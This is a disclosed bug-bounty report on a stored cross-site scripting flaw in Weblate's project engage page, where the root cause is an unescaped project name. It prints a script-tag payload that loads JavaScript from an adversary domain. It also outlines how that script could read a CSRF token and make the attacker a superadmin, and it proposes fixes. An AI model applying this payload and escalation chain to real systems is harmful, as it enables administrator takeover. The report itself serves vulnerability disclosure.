# Stored XSS @ /engage/<project_slug>

## Report Details
- **Report ID**: 472391
- **URL**: https://hackerone.com/reports/472391
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-12-26T22:13:28.975Z
- **Disclosed**: 2019-07-02T12:40:01.189Z

## Reporter
- **Username**: lgian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
## Description
The vulnerability concerns a Stored XSS, while it is currently (to the best of my knowledge) not exploitable due to limitations stated below. I thought that the issue is worth reporting anyway.

## Steps to reproduce
1. Change a project's name (or create one) to the following payload:  
 `<script src="http://<adversery_domain>/payload.js"></script>`, where `<adversary_domain>` could be any domain that you own. For testing purposes you can host the javascript file on localhost.
2. Navigate to `/engage/<project_slug>`, where `<project_slug>` is the project's url slug.
3. Any javascript payload you host will be executed under the origin of weblate.

## Referenced code
The code that is the root cause for the vulnerability is under: `weblate/trans/views/basic.py:show_engage:123`, where `show_engage` is the view called for the `/engage/<project_slug>` url.

### Caveats
1. A project's name is limited to 60 characters, therefore we cannot inject our payload straight into it. A bypass for that is the one referenced in step 1, where we load an external javascript file from a domain we own.
2. By default the application's CSP only allows scripts from certain domains (cdnjs etc.). Although, the default CSP allows `unsafe-inline` when any CDN is enabled.
3. The session cookie is uses the attributes `HttpOnly` and `SameSite=lax`, therefore hijacking the superadmin's session token is impossible (for most browsers).
4. In order to perform the attack, you have to own a user account that can change a project's name, which is true for any project administrator.

#### Possible bypasses
1. A project's name character limit is extended.
2. Since the application supports file uploads and the CSP allows scripts coming from `self` (current domain), one could upload their payload to the Weblate installation. This bypass would require an endpoint that accepts uploading HTML/javascript content and stores it under the `media` uploads. 

### Proof of Concept
In order to get any value of the present XSS, since we cannot steal the superadmin's session token, we can perform any action as the superadmin. That is because we can issue any GET/POST request and read the response, since we operate under the same origin as the hosted application. As mentioned before, in order to perform the following attack, we need a user account that can change a project's name. 

1. Issue a GET request under `admin/weblate_auth/user/` in order to find our user record's ID. 
2. Issue a GET request under `admin/weblate_auth/user/5/change/`, assuming that the ID is 5 for instance.
3. Read the previous' request's response in order to steal the `csrfmiddlewaretoken` that Django injects to protect against such attacks.
4. Issue a POST request using the above information to make our user a superadmin.

The `payload.js` that automatically does the steps 2-4 is attached to the report (except for parsing the response for csrftokenmiddlware, which is trivial using javascript).

## Proposed fixes
1. Escape the project's name using django's `escape` function before output
2. Remove the `unsafe-inline` directive from the CSP when CDNs are enabled.

## Impact

Given a bypass to either the project's name character limit or the CSP, any user that has the ability to change a project's name can make themselves a superuser through CSRF.

## Attachments
- payload.js
